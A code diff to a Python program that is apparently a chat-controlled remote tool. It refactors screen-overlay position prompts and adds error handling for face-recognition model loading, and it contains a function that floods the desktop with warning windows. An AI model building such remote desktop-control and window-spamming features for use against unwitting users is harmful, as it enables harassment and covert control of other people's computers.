@@ -187,7 +187,7 @@ def _patched_popen(*args, **kwargs):
     kwargs.setdefault("stdout", PIPE)
     return Popen(*args, **kwargs)
 
-def get_decrypted_content(fernet: SimpleFernet, src_path) -> str:
+def get_decrypted_content(fernet: SimpleFernet, src_path) -> bytes:
     with open(src_path, "rb") as f:
         encrypted = f.read()
     decrypted = fernet.decrypt(encrypted)
@@ -227,14 +227,22 @@ while isfile(BURN_DIRECTORY):
     BURN_DIRECTORY = BURN_DIRECTORY+randomname(3)
 
 if isfile(prototxt_filename) and isfile(caffemodel_filename):
-    with open(prototxt_filename, 'rb') as f:
-        prototxt_data = f.read()
-    with open(caffemodel_filename, 'rb') as f:
-        caffemodel_data = f.read()
-    prototxt_buffer = np.frombuffer(prototxt_data, dtype=np.uint8)
-    caffemodel_buffer = np.frombuffer(caffemodel_data, dtype=np.uint8)
-    FACERECOGNITION = True
-    net = dnn.readNetFromCaffe(prototxt_buffer.tobytes(), caffemodel_buffer.tobytes())
+    try:
+        if DATA_ENCRYPTION and False:#DISABLED FOR NOW
+            prototxt_data = get_decrypted_content(prototxt_filename)
+            caffemodel_data = get_decrypted_content(caffemodel_filename)
+        else:
+            with open(prototxt_filename, 'rb') as f:
+                prototxt_data = f.read()
+            with open(caffemodel_filename, 'rb') as f:
+                caffemodel_data = f.read()
+        prototxt_buffer = np.frombuffer(prototxt_data, dtype=np.uint8)
+        caffemodel_buffer = np.frombuffer(caffemodel_data, dtype=np.uint8)
+        net = dnn.readNetFromCaffe(prototxt_buffer.tobytes(), caffemodel_buffer.tobytes())
+        FACERECOGNITION = True
+    except Exception as e:
+        print(f"Error while loading face-recognition models:\n{e}\nFACERECOGNITION flag is set to FALSE")
+        FACERECOGNITION = False
 else:
     FACERECOGNITION = False
 
@@ -2003,42 +2011,11 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def parse_video_note(self, saved_filepath: str, document: Any) -> None:
         duration = document.get("duration")
         print(f"Parsing video note: {saved_filepath}, {duration=}")
-        prompt = (
-        "🎯 *Select Position*\n\n"
-        "Choose a position by number:\n\n"
-        "1️⃣ *Top*\n"
-        "2️⃣ *Bottom*\n"
-        "3️⃣ *Left*\n"
-        "4️⃣ *Right*\n"
-        "5️⃣ *Center*\n\n"
-        "Combinations:\n"
-        "6️⃣ *Top\\-Left*\n"
-        "7️⃣ *Top\\-Right*\n"
-        "8️⃣ *Bottom\\-Left*\n"
-        "9️⃣ *Bottom\\-Right*\n\n"
-        "Reply with the corresponding *number*\\."
-        )
-        posx = {
-            "1": "top",
-            "2": "bottom",
-            "3": "left",
-            "4": "right",
-            "5": "center",
-            "6": "top-left",
-            "7": "top-right",
-            "8": "bottom-left",
-            "9": "bottom-right",
-        }
-        pos_idx = self.send_prompt(prompt, delete=True)
-        if pos_idx is None:
-            self.operation_canceled("Action timed out.")
-            return
-        if not pos_idx.isnumeric():
-            self.operation_canceled(f"Choose an option between 1 and {max(posx.keys())}")
-            return
+        position = self.choose_position()
+        if not position: return
         bar = self.new_loading_bar_timed_worker(label="Playing Video Note", duration=int(duration),
                                           target=self.overlay_tk.video_note_overlay,
-                                          args=(saved_filepath, posx[pos_idx]),
+                                          args=(saved_filepath, position),
                                           on_cancel=self.overlay_tk._safe_destroy, block_default_cancel=True)
         if not bar: return
         bar.start()
@@ -2571,6 +2548,47 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             remove(filepath)
             message.delete()
 
+    def choose_position(self) -> str|None:
+        prompt = ("""<b>🎯 Select Position</b>
+Choose a position by number:
+
+<b>Single Positions:</b>
+1️⃣ <b>Top</b>
+2️⃣ <b>Bottom</b>
+3️⃣ <b>Left</b>
+4️⃣ <b>Right</b>
+5️⃣ <b>Center</b>
+
+<b>Combinations:</b>
+6️⃣ <b>Top-Left</b>
+7️⃣ <b>Top-Right</b>
+8️⃣ <b>Bottom-Left</b>
+9️⃣ <b>Bottom-Right</b>
+
+<i>Reply with the corresponding <b>number</b>.</i>>""")
+        posx = {
+            "1": "top",
+            "2": "bottom",
+            "3": "left",
+            "4": "right",
+            "5": "center",
+            "6": "top-left",
+            "7": "top-right",
+            "8": "bottom-left",
+            "9": "bottom-right",
+        }
+        pos_idx = self.send_prompt(prompt, delete=True)
+
+        if pos_idx is None:
+            self.operation_canceled("Action timed out.")
+            return
+
+        if not pos_idx.isnumeric():
+            self.operation_canceled(f"Choose an option between 1 and {max(posx.keys())}")
+            return
+
+        return posx[pos_idx]
+
     def confirmContuinuingWithoutWallpaperBackup(self):
         print("Confirming wallpaper backup")
         if not self.backup_wallpaper_path:
@@ -2686,11 +2704,14 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         except Exception as e:
             self.bsend(f"Error while trying to show image: \n{e}")
 
-    def show_qr_overlay(self, url: str, text: str = "Scan me", duration: int = None):
+    def show_qr_overlay(self, url: str, duration: int, text: str = "Scan me"):
+        position = self.choose_position()
+        if not position: return
         self.overlay_tk.qr_overlay(
             url=url,
             custom_text=text,
-            duration=float(duration) if duration else None
+            duration=float(duration) if duration else None,
+            position=position
         )
         self.bsend(f"QR overlay shown: {url}")
 
@@ -2703,7 +2724,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def spam_windows(self, n: int, text: str) -> None:
         print(f"Spamming {n} windows with text: {text}")
-        for i in range(n):
+        for _ in range(n):
             sp_win = Thread(target=self.message_box, args=["Warning", text,])
             sp_win.start()
     
